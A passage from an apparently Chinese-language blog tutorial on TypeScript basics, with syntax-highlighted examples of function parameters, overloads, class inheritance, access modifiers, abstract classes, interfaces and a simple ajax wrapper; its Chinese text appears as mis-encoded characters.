title="neverç±»å‹"></a>neverç±»å‹</h5><blockquote><p>åŒ…æ‹¬nullå’Œ undefined ï¼Œè¡¨ç¤ºä¸ä¼šå‡ºç°çš„å€¼</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> a:never;</span><br><span class="line">a=(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;é”™è¯¯&#x27;</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="å‡½æ•°çš„å®šä¹‰"><a href="#å‡½æ•°çš„å®šä¹‰" class="headerlink" title="å‡½æ•°çš„å®šä¹‰"></a>å‡½æ•°çš„å®šä¹‰</h4><h5 id="åŒ¿åå‡½æ•°"><a href="#åŒ¿åå‡½æ•°" class="headerlink" title="åŒ¿åå‡½æ•°"></a>åŒ¿åå‡½æ•°</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> func1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>):<span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params"></span>):<span class="title">boolean</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ä¼ å‚"><a href="#ä¼ å‚" class="headerlink" title="ä¼ å‚"></a>ä¼ å‚</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getinfo</span>(<span class="params">name:string, age: number</span>):<span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`æˆ‘æ˜¯<span class="subst">$&#123;name&#125;</span>,å¹´é¾„<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(getinfo(<span class="string">&#x27;æä¸‰&#x27;</span>,<span class="number">20</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="æ— è¿”å›å€¼"><a href="#æ— è¿”å›å€¼" class="headerlink" title="æ— è¿”å›å€¼"></a>æ— è¿”å›å€¼</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func3</span>(<span class="params"></span>):<span class="title">void</span></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;æ²¡è¿”å›å€¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="å¯é€‰å‚æ•°"><a href="#å¯é€‰å‚æ•°" class="headerlink" title="å¯é€‰å‚æ•°"></a>å¯é€‰å‚æ•°</h5><blockquote><p> å¦‚ ä½¿ç”¨?ä¿®é¥° å¦‚ age?:number</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getinfos</span>(<span class="params">name:string, age?:number</span>):<span class="title">string</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">age</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`æˆ‘æ˜¯<span class="subst">$&#123;name&#125;</span>,å¹´é¾„<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`æˆ‘æ˜¯<span class="subst">$&#123;name&#125;</span>,å¹´é¾„ä¿å¯†`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getinfos(<span class="string">&#x27;æå››&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getinfos(<span class="string">&#x27;æå››&#x27;</span>,<span class="number">42</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="é»˜è®¤å‚æ•°"><a href="#é»˜è®¤å‚æ•°" class="headerlink" title="é»˜è®¤å‚æ•°"></a>é»˜è®¤å‚æ•°</h5><blockquote><p> å¦‚ age:number=18</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params">age:number=<span class="number">18</span></span>):<span class="title">number</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`æˆ‘çš„å¹´é¾„æ˜¯<span class="subst">$&#123;getAge()&#125;</span>`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`æˆ‘çš„å¹´é¾„æ˜¯<span class="subst">$&#123;getAge(<span class="number">33</span>)&#125;</span>`</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="å‰©ä½™å‚æ•°"><a href="#å‰©ä½™å‚æ•°" class="headerlink" title="å‰©ä½™å‚æ•°"></a>å‰©ä½™å‚æ•°</h5><blockquote><p>å¦‚ â€¦arrAy</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">...result:number[]</span>):<span class="title">number</span></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sum:number = <span class="number">0</span>;</span><br><span class="line">    result.forEach(<span class="function"><span class="params">ele</span> =&gt;</span> &#123;</span><br><span class="line">        sum+=ele;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="å‡½æ•°é‡è½½"><a href="#å‡½æ•°é‡è½½" class="headerlink" title="å‡½æ•°é‡è½½"></a>å‡½æ•°é‡è½½</h5><blockquote><p>extends super</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">name:string</span>):<span class="title">string</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">age:number</span>):<span class="title">number</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params">str:any</span>):<span class="title">any</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params"><span class="keyword">typeof</span> str === <span class="string">&#x27;string&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æˆ‘å«&#x27;</span>+str;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;æˆ‘çš„å¹´é¾„æ˜¯&#x27;</span>+str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getName(<span class="string">&#x27;ç‹è€äº”&#x27;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(getName(<span class="number">23</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ç±»çš„å®šä¹‰"><a href="#ç±»çš„å®šä¹‰" class="headerlink" title="ç±»çš„å®šä¹‰"></a>ç±»çš„å®šä¹‰</h4><blockquote><p>extends super</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ç±»çš„å®šä¹‰</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    name:string; <span class="comment">//å±æ€§ çœç•¥äº†public å…³é”®è¯</span></span><br><span class="line">    private salary:number=<span class="number">10000</span>;</span><br><span class="line">    protected children:number = <span class="number">2</span>;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123; <span class="comment">// æ„é€ å‡½æ•°ï¼Œ å®ä¾‹åŒ–çš„æ—¶å€™è§¦å‘çš„æ–¹æ³•</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    run():<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name,<span class="string">&#x27;å·¥èµ„ï¼š&#x27;</span>+<span class="built_in">this</span>.salary,<span class="string">&#x27;æœ‰&#x27;</span>+<span class="built_in">this</span>.children+<span class="string">&#x27;ä¸ªå­©å­&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getName():string&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    setName(name:string):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> person:Person = <span class="keyword">new</span> Person(<span class="string">&#x27;å°æ˜&#x27;</span>);</span><br><span class="line">person.run();</span><br><span class="line">person.setName(<span class="string">&#x27;æå››&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;æˆ‘çš„åå­—æ˜¯ï¼š&#x27;</span>+person.getName());</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ç±»çš„ç»§æ‰¿"><a href="#ç±»çš„ç»§æ‰¿" class="headerlink" title="ç±»çš„ç»§æ‰¿"></a>ç±»çš„ç»§æ‰¿</h5><blockquote><p>extends super</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WoMan</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&#x27;å¥³äºº&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> woMan:Person = <span class="keyword">new</span> WoMan();</span><br><span class="line">woMan.run();</span><br><span class="line">woMan.setName(<span class="string">&#x27;å¥³äººä»¬&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(woMan.getName());</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ç±»çš„ä¿®é¥°ç¬¦"><a href="#ç±»çš„ä¿®é¥°ç¬¦" class="headerlink" title="ç±»çš„ä¿®é¥°ç¬¦"></a>ç±»çš„ä¿®é¥°ç¬¦</h5><blockquote><p>public:     å…¬æœ‰      åœ¨å£°æ˜çš„ç±»é‡Œé¢ã€ç»§æ‰¿å£°æ˜çš„å­ç±»ã€è°ƒç”¨ç±»çš„å®åŠ›åŒ–å¯¹è±¡éƒ½å¯ä»¥è®¿é—®<br>protected:  ä¿æŠ¤ç±»å‹   åœ¨å£°æ˜çš„ç±»é‡Œé¢ã€ç»§æ‰¿å£°æ˜çš„å­ç±»å¯ä»¥è®¿é—®ï¼Œè°ƒç”¨ç±»çš„å®åŠ›åŒ–å¯¹è±¡æ²¡æ³•è®¿é—®<br>private:    ç§æœ‰       åœ¨å£°æ˜çš„ç±»é‡Œé¢å¯ä»¥è®¿é—®ï¼Œç»§æ‰¿å£°æ˜çš„å­ç±»å¯ä»¥è®¿é—®ï¼Œè°ƒç”¨ç±»çš„å®åŠ›åŒ–å¯¹è±¡ä¸å¯ä»¥è®¿é—®</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    private smoke:boolean=<span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&#x27;ç”·äºº&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    run():<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`è¿™ä¸ª<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span> <span class="subst">$&#123;<span class="built_in">this</span>.smoke ? <span class="string">&#x27;å¸çƒŸ&#x27;</span> : <span class="string">&#x27;ä¸å¸çƒŸ&#x27;</span>&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// console.log(`è¿™ä¸ª$&#123;this.name&#125;çš„å·¥èµ„$&#123;this.salary&#125;`);</span></span><br><span class="line">        <span class="comment">// -- æç¤º privateä¿®é¥°çš„salary å±æ€§ åªèƒ½åœ¨ Person å£°æ˜å±æ€§çš„ç±»ä¸­è®¿é—®</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`è¿™ä¸ª<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>æœ‰<span class="subst">$&#123;<span class="built_in">this</span>.children&#125;</span>ä¸ªå­©å­`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> man:Person = <span class="keyword">new</span> Man();</span><br><span class="line">man.run();</span><br><span class="line">man.setName(<span class="string">&#x27;ç”·äººä»¬&#x27;</span>);</span><br><span class="line"><span class="comment">// console.log(`è¿™ä¸ª$&#123;man.name&#125;æœ‰$&#123;man.children&#125;ä¸ªå­©å­`);</span></span><br><span class="line"><span class="comment">// -- æç¤º protectedä¿®é¥°çš„ children å±æ€§ åªèƒ½åœ¨ å£°æ˜å±æ€§çš„ç±»åŠå­ç±»å†…éƒ¨è®¿é—®</span></span><br><span class="line"><span class="built_in">console</span>.log(man.getName());</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="é™æ€æ–¹æ³•åŠå±æ€§"><a href="#é™æ€æ–¹æ³•åŠå±æ€§" class="headerlink" title="é™æ€æ–¹æ³•åŠå±æ€§"></a>é™æ€æ–¹æ³•åŠå±æ€§</h5><blockquote><p>ç§æœ‰æ–¹æ³•ä¸å¯ä»¥è®¿é—® é™æ€çš„æ–¹æ³•ä¹¦é™æ€å±æ€§<br>é™æ€æ–¹æ³•ä¹Ÿä¸å¯ä»¥è®¿é—® ç§æœ‰çš„æ–¹æ³•å’Œç§æœ‰çš„å±æ€§</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    name:string = <span class="string">&#x27;å“®å¤©çŠ¬&#x27;</span>;</span><br><span class="line">    <span class="keyword">static</span> work:string = <span class="string">&#x27;çœ‹é—¨&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">    eat(food:string):string&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>åƒ<span class="subst">$&#123;food&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> sleep():<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;ç‹—ç¡è§‰&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog = <span class="keyword">new</span> Dog();</span><br><span class="line"><span class="built_in">console</span>.log(dog.eat(<span class="string">&#x27;éª¨å¤´&#x27;</span>));</span><br><span class="line">Dog.sleep();</span><br><span class="line"><span class="built_in">console</span>.log(dog.name+Dog.work);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h5><blockquote><p> å¤šæ€ï¼šå®šä¹‰æ–¹æ³•ä¸å»å®ç°ï¼Œè®©ç»§æ‰¿ç±»å»å®ç°æ–¹æ³•ä½“</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    name:string;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å®šä¹‰æ–¹æ³•ä¸å»å®ç°ï¼Œè®©ç»§æ‰¿ç±»å»å®ç°æ–¹æ³•ä½“</span></span><br><span class="line">    eat(food:string):<span class="keyword">void</span>&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    eat(food:string):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>åƒ<span class="subst">$&#123;food&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> cat:Cat = <span class="keyword">new</span> Cat(<span class="string">&#x27;ğŸ±çŒ« &#x27;</span>);</span><br><span class="line">cat.eat(<span class="string">&#x27;è€é¼ &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snake</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">name:string</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    eat(food:string):<span class="keyword">void</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="built_in">this</span>.name&#125;</span>åƒ<span class="subst">$&#123;food&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> snake:Snake = <span class="keyword">new</span> Snake(<span class="string">&#x27;ğŸè›‡ &#x27;</span>);</span><br><span class="line">snake.eat(<span class="string">&#x27;é’è›™&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h5><blockquote><p>abstract ä¿®é¥°<br>æŠ½è±¡ï¼šè¦æ±‚è¯¥æŠ½è±¡ç±»çš„å­ç±»(æ´¾ç”Ÿç±»)å¿…é¡»å®ç°æŠ½è±¡æ–¹æ³•ï¼Œåä¹‹å¤šæ€å´å¯ä»¥ä¸å®ç°</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Food</span> </span>&#123;</span><br><span class="line">    abstract saff(food:string):boolean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tomato</span> <span class="keyword">extends</span> <span class="title">Food</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    saff(food:string):boolean&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tomato:Food= <span class="keyword">new</span> Tomato();</span><br><span class="line"><span class="built_in">console</span>.log(tomato.saff(<span class="string">&#x27;è¥¿çº¢æŸ¿&#x27;</span>)?<span class="string">&#x27;è¥¿çº¢æŸ¿æ˜¯å®‰å…¨é£Ÿç‰©&#x27;</span>:<span class="string">&#x27;è¥¿çº¢æŸ¿ä¸æ˜¯å®‰å…¨é£Ÿç‰©&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="æ¥å£çš„å®šä¹‰"><a href="#æ¥å£çš„å®šä¹‰" class="headerlink" title="æ¥å£çš„å®šä¹‰"></a>æ¥å£çš„å®šä¹‰</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface FullName&#123;</span><br><span class="line">    firstname:string;</span><br><span class="line">    lastName:string;</span><br><span class="line">    secoundName?:string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNames</span>(<span class="params">name:FullName</span>):<span class="title">void</span></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(name);</span><br><span class="line">&#125;</span><br><span class="line">getNames(&#123;</span><br><span class="line">    firstname: <span class="string">&#x27;æ&#x27;</span>,</span><br><span class="line">    lastName: <span class="string">&#x27;å››&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">getNames(&#123;</span><br><span class="line">    firstname: <span class="string">&#x27;æ&#x27;</span>,</span><br><span class="line">    lastName: <span class="string">&#x27;å››&#x27;</span>,</span><br><span class="line">    secoundName: <span class="string">&#x27;å¤–å·-äººç§°åˆ€ç–¤æå››&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="æ¡ˆä¾‹-ajax-æ¥å£å°è£…"><a href="#æ¡ˆä¾‹-ajax-æ¥å£å°è£…" class="headerlink" title="æ¡ˆä¾‹ ajax æ¥å£å°è£…"></a>æ¡ˆä¾‹ ajax æ¥å£å°è£…</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface Config&#123;</span><br><span class="line">    method: string;</span><br><span class="line">    url:string;</span><br><span class="line">    data?:string;</span><br><span class="line">    dataType:string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">config:Config</span>):<span class="title">any</span></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(config.method,config.url, <span class="literal">true</span>);</span><br><span class="line">    xhr.send(config.data);</span><br><span class="line">    xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span></span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">config.dataType == <span class="string">&#x27;json&#x27;</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> xhr.responseText;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax(&#123;</span><br><span class="line">    method: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    url: <span class="string">&#x27;https://blog.youngzk.com&#x27;</span>,</span><br><span class="line">    dataType:<span class="string">&#x27;text&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 